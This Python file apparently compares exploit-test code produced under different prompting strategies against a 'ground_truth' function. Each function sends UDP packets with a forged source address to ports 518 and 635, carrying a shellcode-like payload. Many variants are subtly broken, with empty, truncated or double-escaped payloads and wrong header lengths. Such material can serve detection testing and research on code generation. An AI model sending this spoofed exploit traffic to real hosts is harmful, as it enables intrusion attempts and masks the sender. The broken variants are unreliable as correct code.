from scapy.all import *
import ipaddress
import warnings
from ipaddress import *
import re

def is_valid_ip(address):
    try:
        socket.inet_pton(socket.AF_INET, address)
    except AttributeError:
        try:
            socket.inet_aton(address)
        except socket.error:
            return False
        return address.count('.') == 3
    except socket.error:
        return False
    return True


def ground_truth_code_exploitTest(src, dst, iface, count):
    
    pkt = IP(src=src, dst=dst) / UDP(dport=518) / Raw(load=b"\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8")
    send(pkt, iface=iface, count=count)
    
    pkt = IP(src=src, dst=dst) / UDP(dport=635) / Raw(load=b"^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F")
    send(pkt, iface=iface, count=count)

def persona_exploitTest(src, dst, iface, count):
	import socket
	s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
	s.bind(('', 0))
	s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
	s.setsockopt(socket.SOL_SOCKET, 25, iface.encode('utf-8'))
	for i in range(count):
		packet1 = b'\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8'
		s.sendto(packet1, (dst, 518))
		packet2 = b'^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F'
		s.sendto(packet2, (dst, 635))

def template_exploitTest(src, dst, iface, count):
    try:
        from scapy.all import IP, UDP, send
        first_pkt = IP(src=src, dst=dst) / UDP(dport=518) / "\xe8"
        second_pkt = IP(src=src, dst=dst) / UDP(dport=635) / "^\xb0\x89\x06\xfe\xc8\x89F\x04\xb0\x06\x89F"
        for _ in range(count):
            send(first_pkt, iface=iface)
            send(second_pkt, iface=iface)
    except Exception as e:
        pass

def question_refinement_exploitTest(src, dst, iface, count):
    try:
        import socket
        import struct
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        src = socket.inet_pton(socket.AF_INET, src)
        dst = socket.inet_pton(socket.AF_INET, dst)
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 0
        ip_id = 54321
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_UDP
        ip_check = 0
        ip_saddr = src
        ip_daddr = dst
        ip_ihl_ver = (ip_ver << 4) + ip_ihl
        ip_header = struct.pack('!BBHHHBBH4s4s' , ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
        udp_dport = 518
        udp_sport = 12345
        udp_length = 8
        udp_checksum = 0
        udp_header = struct.pack('!HHHH', udp_sport, udp_dport, udp_length, udp_checksum)
        load = b'\\x01\\x03\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x02\\\x02\\xE8'
        packet = ip_header + udp_header + load
        udp_dport = 635
        udp_sport = 12346
        udp_length = 10
        udp_checksum = 0
        udp_header = struct.pack('!HHHH', udp_sport, udp_dport, udp_length, udp_checksum)
        load = b'^\\xB0\\x02\\x89\\x06\\xFE\\xC8\\x89F\\x04\\xB0\\x06\\x89F'
        packet2 = ip_header + udp_header + load
        for i in range(count):
            s.sendto(packet, (socket.inet_ntoa(dst), 0 ))
            s.sendto(packet2, (socket.inet_ntoa(dst), 0 ))
        s.close()
    except socket.error as msg:
        print ('Socket Error:', msg.strerror)
    except struct.error as e:
        print ('Struct Error:', e)

def alternative_approaches_exploitTest(src, dst, iface, count):
    from scapy.all import IP, UDP, Raw, sendp
    import ipaddress
    if not isinstance(count, int) or count < 0:
        return
    try:
        src_ip = ipaddress.ip_address(src)
        dst_ip = ipaddress.ip_address(dst)
    except ValueError:
        return
    for _ in range(count):
        try:
            pkt = IP(src=str(src_ip), dst=str(dst_ip))/UDP(dport=518)/Raw(load=b'\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8')
            sendp(pkt, iface=iface)
            pkt = IP(src=str(src_ip), dst=str(dst_ip))/UDP(dport=635)/Raw(load=b'^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F')
            sendp(pkt, iface=iface)
        except Exception as e:
            raise RuntimeError('Failed to send packet:', e)

def context_manager_exploitTest(src, dst, iface, count):
        pkt = IP(src=src, dst=dst) / UDP(dport=518) / Raw(load=b'')
        sendp(pkt, iface=iface, count=count)
        pkt = IP(src=src, dst=dst) / UDP(dport=635) / Raw(load=b'^F^F')
        sendp(pkt, iface=iface, count=count)

def flipped_interaction_3_exploitTest(src, dst, iface, count):
        for _ in range(count):
                send(IP(src=src, dst=dst) / UDP(dport=518) / Raw(load="E8"), iface=iface)
                send(IP(src=src, dst=dst) / UDP(dport=635) / Raw(load="^B0897EC889F04B089F"), iface=iface)

def flipped_interaction_4_exploitTest(src, dst, iface, count):
    payload1 = "\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8"
    pkt1 = IP(src=src, dst=dst) / UDP(dport=518) / Raw(load=payload1)
    payload2 = b"^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F"
    pkt2 = IP(src=src, dst=dst) / UDP(dport=635) / Raw(load=payload2)
    print(f"Sending {count} packets from {src} to {dst} on UDP port 518 with payload {payload1}")
    send(pkt1, iface=iface, count=count, verbose=False)
    print(f"Sending {count} packets from {src} to {dst} on UDP port 635 with payload {payload2}")
    send(pkt2, iface=iface, count=count, verbose=False)

def flipped_interaction_5_exploitTest(src, dst, iface, count):
    import scapy.all as scapy
    from scapy.layers.inet import IP, UDP
    import logging
    logger = logging.getLogger()
    logger.setLevel(logging.INFO)
    handler = logging.StreamHandler()
    formatter = logging.Formatter('%(message)s')
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    payloads = ["", "^FF"]
    ports = [518, 635]
    for i in range(count):
        for payload, port in zip(payloads, ports):
            pkt = IP(src=src, dst=dst) / UDP(dport=port) / payload
            try:
                scapy.send(pkt, iface=iface, verbose=0)
                logger.info(f'Time: {scapy.utils.timestamp()} | Src: {src} | Dst: {dst} | Port: {port} | Payload: {payload}')
            except Exception as e:
                logger.error(f'Error sending packet: {e}')

def iterative_prompting_3_exploitTest(src, dst, iface, count):
    if not isinstance(src, str) or not isinstance(dst, str):
        raise ValueError('Source and destination must be strings.')
    if not isinstance(iface, str):
        raise ValueError('Interface must be a string.')
    if not isinstance(count, int) or count < 1:
        raise ValueError('Count must be a positive integer.')
    try:
        pkt1 = IP(src=src, dst=dst) / UDP(dport=518) / Raw(load='\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8')
        send(pkt1, iface=iface, count=count, verbose=0)
    except Exception as e:
        print(f'Error sending pkt1: {e}')
    try:
        pkt2 = IP(src=src, dst=dst) / UDP(dport=635) / Raw(load='^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F')
        send(pkt2, iface=iface, count=count, verbose=0)
    except Exception as e:
        print(f'Error sending pkt2: {e}')

def iterative_prompting_4_exploitTest(src, dst, iface, count):
    try:
        from scapy.all import IP, UDP, Raw, send
        if not isinstance(src, str) or not isinstance(dst, str) or ':' in src or ':' in dst:
            raise ValueError('Source and destination IP addresses must be valid IPv4 strings without colons.')
        if not isinstance(iface, str):
            raise ValueError('Interface must be a string.')
        if not isinstance(count, int) or count < 0:
            raise ValueError('Count must be a non-negative integer.')
        pkt1 = IP(src=src, dst=dst) / UDP(dport=518) / Raw(load="\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8")
        pkt2 = IP(src=src, dst=dst) / UDP(dport=635) / Raw(load="^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F")
        for _ in range(count):
            send(pkt1, iface=iface, verbose=False)
            send(pkt2, iface=iface, verbose=False)
    except Exception as e:
        print(f'An error occurred: {e}')

def iterative_prompting_5_exploitTest(src, dst, iface, count):
    try:
        if not isinstance(src, str) or not isinstance(dst, str):
            raise ValueError('\'Source and destination must be strings.\'')
        if not isinstance(iface, str):
            raise ValueError('\'Interface must be a string.\'')
        if not isinstance(count, int) or count < 1:
            raise ValueError('\'Count must be a positive integer.\'')
        pkt = Ether()
        pkt /= IP(src=src, dst=dst)
        pkt /= UDP(dport=518, sport=12345)
        pkt /= Raw(load='\\x01\\x03\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x02\\x02\\xE8')
        sendp(pkt, iface=iface, count=count)
        pkt[UDP].dport = 635
        pkt[Raw].load = '^\\xB0\\x02\\x89\\x06\\xFE\\xC8\\x89F\\x04\\xB0\\x06\\x89F'
        sendp(pkt, iface=iface, count=count)
    except ValueError as ve:
        print(str(ve))
    except Exception as e:
        print(f'An error occurred: {str(e)}')

def few_shots_prompting_exploitTest(src, dst, iface, count):
    pkt = IP(src=src, dst=dst) / UDP(dport=518) / Raw(load='')
    send(pkt)
    pkt = IP(src=src, dst=dst) / UDP(dport=635) / Raw(load='^\xb0\u0002\x89\u0006\u00fe\u00c8\x89F\u0004\xb0\u0006\x89F')
    send(pkt, iface=iface, count=count)

def cot_prompting_exploitTest(src, dst, iface, count):
	pkt = IP(src=src, dst=dst) / UDP(dport=518) / Raw(load='\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8')
	send(pkt)
	pkt = IP(src=src, dst=dst) / UDP(dport=635) / Raw(load='^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F')
	send(pkt, iface=iface, count=count)

def fact_check_list_exploitTest(src, dst, iface, count):
    pkt1 = IP(src=src, dst=dst) / UDP(dport=518) / b"\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8"
    pkt2 = IP(src=src, dst=dst) / UDP(dport=635) / b"^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F"
    send(pkt1, iface=iface, count=count)
    send(pkt2, iface=iface, count=count)

def not_interactive_mix_exploitTest(src, dst, iface, count):
    try:
        if not is_valid_ip(src) or not is_valid_ip(dst):
            raise ValueError("Invalid IP address format")
        if not isinstance(count, int) or count < 1:
            raise ValueError("Count must be a positive integer")
        pkt1 = IP(src=src, dst=dst) / UDP(dport=518) / Raw(load="\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8")
        send(pkt1, iface=iface, count=count, verbose=False)
        pkt2 = IP(src=src, dst=dst) / UDP(dport=635) / Raw(load="^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F")
        send(pkt2, iface=iface, count=count, verbose=False)
    except Exception as e:
        raise RuntimeError(f"An error occurred: {e}")

def interactive_mix_exploitTest(src, dst, iface, count):
    import socket
    import ipaddress
    from scapy.all import IP, UDP, Raw, send, get_if_list
    import sys
    def is_valid_ip(ip):
        try:
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            return False
    def is_private_ip(ip):
        return ipaddress.ip_address(ip).is_private
    def is_loopback_ip(ip):
        return ipaddress.ip_address(ip).is_loopback
    if not is_valid_ip(src) or not is_valid_ip(dst):
        raise ValueError("Invalid IP address provided.")
    if is_private_ip(src) or is_private_ip(dst):
        raise ValueError("Private IP address is not allowed.")
    if is_loopback_ip(src) or is_loopback_ip(dst):
        raise ValueError("Loopback IP address is not allowed.")
    if iface not in get_if_list():
        raise ValueError(f"Invalid network interface: {iface}")
    if not isinstance(count, int) or count <= 0:
        raise ValueError("Count must be a positive integer.")
    pkt1 = IP(src=src, dst=dst) / UDP(dport=518) / Raw(load="\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8")
    pkt2 = IP(src=src, dst=dst) / UDP(dport=635) / Raw(load="^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F")
    try:
        send(pkt1, iface=iface, count=count, verbose=0)
        send(pkt2, iface=iface, count=count, verbose=0)
    except Exception as e:
        raise RuntimeError(f"Failed to send packet: {str(e)}")

def baseline_exploitTest(src, dst, iface, count):
	for i in range(count):
		pkt1 = IP(src=src, dst=dst) / UDP(dport=518) / Raw(load='\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8')
		send(pkt1, iface=iface)
		pkt2 = IP(src=src, dst=dst) / UDP(dport=635) / Raw(load='^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F')
		send(pkt2, iface=iface)

